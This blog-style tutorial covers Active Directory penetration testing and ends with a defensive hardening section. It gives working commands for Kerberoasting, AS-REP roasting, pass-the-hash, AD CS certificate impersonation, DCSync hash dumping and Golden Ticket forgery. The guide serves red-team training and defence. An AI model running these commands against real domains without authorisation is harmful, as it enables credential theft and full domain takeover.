---
title: "Active Directory Security & Penetration Testing Guide: Attack Paths, Kerberos & AD CS"
date: 2025-01-01 12:01:00 +0300
categories: [Cyber Security, Active Directory]
tags: [active-directory, kerberos, bloodhound, privilege-escalation, pentesting, adcs, rubeus, impacket]
description: "An exhaustive technical breakdown of Active Directory penetration testing, covering LDAP reconnaissance, BloodHound graph analysis, Kerberoasting, AS-REP Roasting, AD CS ESC1-ESC8 abuse, DCSync, and defensive tiering."
toc: true
schema:
  type: Article
  author: Abdulrahman Mohamed
---

Active Directory Domain Services (AD DS) forms the identity and access management backbone of over 90% of Fortune 500 enterprises. Because it governs authentication, group policies, access control lists (ACLs), and computer trust accounts across the corporate perimeter, assessing Active Directory environments is one of the most critical disciplines in offensive security and red teaming.

In real-world enterprise environments, attackers rarely rely on unpatched software exploits to compromise an entire domain. Instead, they exploit architectural trust, overprivileged delegation, default configuration remnants, and identity protocol quirks to move laterally and escalate privileges from an unprivileged domain user to Domain Admin.

In this comprehensive guide, we deconstruct the core phases of Active Directory penetration testing: **domain reconnaissance**, **Kerberos-based identity attacks**, **Active Directory Certificate Services (AD CS) exploitation**, **lateral movement & DCSync**, and **enterprise defensive hardening**.

---

## 1. Domain Enumeration & Graph-Based Reconnaissance

Reconnaissance in an Active Directory environment involves querying the LDAP directory database to identify high-value targets, administrative groups, service accounts, and hidden permission delegations.

### Automated LDAP Enumeration with PowerView

PowerView (part of PowerSploit) allows offensive engineers to interrogate Active Directory using native Windows .NET LDAP queries without executing noisy port scans:

```powershell
# Import PowerView module
Import-Module .\\PowerView.ps1

# Enumerate Domain Controllers
Get-DomainController

# Identify all members of the Domain Admins group
Get-DomainGroupMember -Identity "Domain Admins" | Select-Object MemberName, MemberDistinguishedName

# Find user accounts with Service Principal Names (SPNs) set
Get-DomainUser -SPN | Select-Object samaccountname, serviceprincipalname

# Identify accounts configured with pre-authentication disabled
Get-DomainUser -PreauthNotRequired | Select-Object samaccountname, useraccountcontrol

# Enumerate machines where the current user possesses local administrative privileges
Find-LocalAdminAccess -Verbose
```

### Attack Path Mapping with BloodHound

Traditional tabular data fails to reveal indirect, multi-hop permission chains (e.g., User A can reset password of User B, who can write to Group C, which has GenericAll over Domain Admin).

**BloodHound** ingests Active Directory relationships using graph theory (powered by Neo4j), visualizing the shortest path to domain compromise:

```powershell
# Execute SharpHound collector to dump domain graph data
Invoke-BloodHound -CollectionMethod All -Domain target.local -ZipFileName ad_collection.zip
```

#### High-Value BloodHound Relationships to Audit:
* `GenericAll`: Grants full control over the target object (reset password, modify group membership, add SPNs).
* `GenericWrite` / `WriteDacl`: Allows modifying permissions to grant oneself full access.
* `ForceChangePassword`: Permits changing the target user's password without knowing the current one.
* `AddMember`: Allows adding arbitrary accounts into privileged groups.

---

## 2. Kerberos Protocol & Identity Attacks

Kerberos is the primary authentication protocol in Active Directory. Its design relies on symmetric tickets and cryptographic sessions, introducing specific attack vectors when accounts are misconfigured.

### Kerberoasting

Kerberoasting allows an authenticated domain user to request encrypted Kerberos service tickets (TGS) for any service account possessing a registered Service Principal Name (SPN), then crack the service ticket's password hash offline.

#### Exploitation Mechanics:
1. Any authenticated domain account requests a TGS ticket for an SPN from the Domain Controller (KDC).
2. The KDC generates the ticket encrypted with the **NTLM hash of the service account**.
3. The attacker extracts the encrypted ticket blob from memory and cracks it offline using Hashcat or John the Ripper.

```bash
# Requesting TGS tickets using Impacket from Linux
impacket-GetUserSPNs target.local/jdoe:Password123! -dc-ip 10.10.10.1 -request -outputfile kerberoast_hashes.txt

# Requesting TGS tickets using Rubeus on Windows
Rubeus.exe kerberoast /outfile:kerberoast.txt /nowrap
```

```bash
# Cracking TGS-REP hashes offline with Hashcat (Mode 13100)
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt -r rules/best64.rule
```

### AS-REP Roasting

When a user account has the `DONT_REQ_PREAUTH` flag enabled in its `UserAccountControl` attribute, the client does not need to send an encrypted timestamp to the KDC to request an initial Ticket Granting Ticket (TGT).

#### Exploitation:
The attacker simply requests an AS-REP from the KDC for that username. The KDC returns the encrypted ticket material, which the attacker cracks offline:

```bash
# Harvesting AS-REP hashes with Impacket (no domain credentials required if usernames are known)
impacket-GetNPUsers target.local/ -usersfile domain_users.txt -format hashcat -outputfile asrep_hashes.txt

# Harvesting AS-REP hashes with Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
```

```bash
# Cracking AS-REP hashes with Hashcat (Mode 18200)
hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt
```

### Pass-the-Hash (PtH) & Overpass-the-Hash

If an attacker captures the NTLM hash of an account (from memory, LSASS, or SAM), they do not need to crack the plaintext password to authenticate across SMB/RPC:

```bash
# Authenticating via Pass-the-Hash with Impacket wmiexec
impacket-wmiexec -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 Administrator@10.10.10.20

# Converting NTLM hash into Kerberos TGT (Overpass-the-Hash / Pass-the-Key)
Rubeus.exe asktgt /user:Administrator /rc4:31d6cfe0d16ae931b73c59d7e0c089c0 /ptt
```

---

## 3. Active Directory Certificate Services (AD CS) Exploitation

Discovered by Will Schroeder and Lee Christensen in their seminal research *"Certified Pre-Owned"*, misconfigured Enterprise Public Key Infrastructure (PKI) templates represent one of the most reliable vectors for instant Domain Admin privilege escalation.

### ESC1: Enrollee Supplies Subject

ESC1 occurs when a certificate template is configured with:
1. Low-privilege enrollment permissions (`Authenticated Users` or `Domain Users`).
2. Client Authentication Extended Key Usage (EKU) or Smart Card Logon.
3. The flag `CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT` is set, allowing the enrollee to specify an arbitrary Subject Alternative Name (SAN).

#### Exploiting ESC1 with Certipy:

```bash
# 1. Enumerate vulnerable AD CS certificate templates
certipy find -u jdoe@target.local -p 'Password123!' -dc-ip 10.10.10.1 -vulnerable

# 2. Request a certificate impersonating the Domain Administrator
certipy req -u jdoe@target.local -p 'Password123!' -ca TARGET-CA -template CorpUser -upn administrator@target.local

# 3. Authenticate using the generated PFX certificate to retrieve Administrator's NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 10.10.10.1
```

### ESC8: NTLM Relay to AD CS HTTP Enrollment

When the AD CS Web Enrollment service (`/certsrv/`) is exposed without Extended Protection for Authentication (EPA) or HTTPS enforcement, an attacker can coerce NTLM authentication from a domain machine (using PetitPotam or PrinterBug) and relay it directly to the certificate enrollment endpoint to generate a machine certificate and compromise the host.

---

## 4. Lateral Movement & Domain Dominance

Once elevated privileges or appropriate delegable rights are acquired, offensive engineers execute credential dumping and persistence actions.

### DCSync: Extracting Hashes via Replication

DCSync allows an attacker to simulate a Domain Controller and request password hashes directly using the Directory Replication Service Remote Protocol (MS-DRSR):

* **Required Rights**: `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.
* **Advantage**: The attacker does not need to execute code on the Domain Controller itself or dump the `NTDS.dit` file from disk; replication commands are issued remotely over RPC.

```bash
# Executing DCSync against the Domain Controller
impacket-secretsdump target.local/Administrator:Password123!@10.10.10.1 -just-dc

# Targeted DCSync for the krbtgt account (for Golden Ticket generation)
impacket-secretsdump target.local/Administrator:Password123!@10.10.10.1 -just-dc-user krbtgt
```

### The Golden Ticket (Domain Persistence)

With the NTLM hash of the `krbtgt` account, an attacker can forge a Ticket Granting Ticket (TGT) valid for 10 years, injecting arbitrary group memberships (e.g., Domain Admins, Enterprise Admins) into the Privilege Attribute Certificate (PAC):

```bash
# Generating and injecting a Golden Ticket using Mimikatz
kerberos::golden /user:fakeadmin /domain:target.local /sid:S-1-5-21-123456789-123456789-123456789 /krbtgt:b05b38a798b3c8f8b8a7b8c8d8e8f8a8 /id:500 /ptt
```

---

## 5. Enterprise Defensive Hardening & Architecture

Securing Active Directory requires establishing architectural boundaries that prevent single-credential compromises from cascading across the enterprise:

### 1. The Tiered Administration Model (Tier 0, 1, 2)
* **Tier 0 (Identity Plane)**: Domain Controllers, AD CS, Azure AD Connect, PKI, and Tier 0 administrators. Tier 0 accounts are strictly prohibited from logging into lower-tier workstations or servers.
* **Tier 1 (Enterprise Infrastructure)**: Application servers, database clusters, and corporate services.
* **Tier 2 (Workstations & Endpoints)**: User laptops, desktop machines, and local admin accounts.
* **Mitigation**: Prevents LSASS credential dumping on compromised user workstations from exposing Domain Admin credentials.

### 2. Protected Users Security Group
Adding high-privilege administrators to the **Protected Users** group enforces strict cryptographic boundaries:
* Disables NTLM authentication (forces Kerberos).
* Prevents caching credentials in LSASS memory (wipes credentials upon logout).
* Restricts Kerberos pre-authentication encryption to AES only (blocks RC4 / DES).
* Limits TGT lifetime to 4 hours.

### 3. Automated Credential Management: LAPS & gMSA
* **Windows LAPS (Local Administrator Password Solution)**: Automatically generates unique, complex, rotating passwords for local administrator accounts on every domain workstation and stores them securely in AD attributes.
* **Group Managed Service Accounts (gMSA)**: Eliminates static service account passwords by having the Domain Controller rotate 128-character complex passwords automatically, rendering Kerberoasting ineffective.

---

## References & Authoritative Reading

1. Schroeder, Will, and Christensen, Lee. *Certified Pre-Owned: Abusing Active Directory Certificate Services*. SpecterOps Research, 2021.
2. Metcalf, Sean. *Active Directory Security Architecture & Defense*. ADSecurity.org.
3. [BloodHound Enterprise & Community Documentation](https://bloodhound.readthedocs.io/)
4. [Microsoft Learn — Active Directory Domain Services Security Guidelines](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/)
5. [MITRE ATT&CK Matrix for Enterprise: Active Directory Techniques](https://attack.mitre.org/matrices/enterprise/)

---

## Let's Connect

Have you conducted Active Directory assessments or investigated complex attack paths? Share your thoughts below:

* [LinkedIn](https://www.linkedin.com/in/3bdo-fathi) · [GitHub](https://github.com/3bdo-fathi) · [Contact Page](/contact-me/)

*— Abdulrahman M. Fathi*
